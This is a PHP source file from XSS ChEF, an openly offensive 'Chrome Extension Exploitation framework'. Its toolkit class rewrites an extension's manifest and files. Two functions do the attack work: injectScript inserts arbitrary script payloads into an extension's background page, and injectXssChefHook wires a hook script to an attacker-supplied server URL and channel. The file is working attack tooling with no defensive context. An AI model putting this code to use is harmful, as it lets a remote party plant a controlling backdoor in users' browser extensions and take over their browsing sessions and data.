<?php
/*
    XSS ChEF - Chrome Extension Exploitation framework
    Copyright (C) 2012  Krzysztof Kotowicz - http://blog.kotowicz.net

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
class ChromeExtensionToolkit {
    var $ext = '';
    
    function __construct($extpath) {
        if (empty($extpath)) {
            throw new Exception("Empty extension path");
        }
    
        if (!is_dir($extpath)) {
            throw new Exception("Invalid extension path");
        }

        $this->ext = $extpath;
    }
    
    function getManifest() {
        $f = $this->getFile('manifest.json');
        $manifest = @file_get_contents($f);
        $manifest = json_decode($manifest, true);
        if (!$manifest)
            throw new Exception("Invalid $f");
        return $manifest;
    }
    
    function saveManifest($manifest) {
        $this->saveFile('manifest.json', json_encode($manifest));
    }

    function saveFile($file, $contents) {
        file_put_contents($this->getFile($file), $contents);
    }
    
    function getFile($file) {
        return $this->ext . DIRECTORY_SEPARATOR . $file;
    }
    
    function injectScript($bcg, $payload) {
        $bcg = @file_get_contents($this->getFile($bcg));
        if (!$payload) {
            return $bcg;
        }
        return preg_replace('#(\<head\>|\Z)#i', "\$1\n<script>" . $payload . '</script>', $bcg, 1);
    }
    
    function injectXssChefHook($bcg, $server_url, $channel) {
        $hook = file_get_contents(__DIR__ . '/../xsschef.js');
        $hook = str_replace('__URL__', $server_url, $hook);
        $hook = str_replace('__CHANNEL__', $channel, $hook);
        return $this->injectScript($bcg, $hook);
    }
}
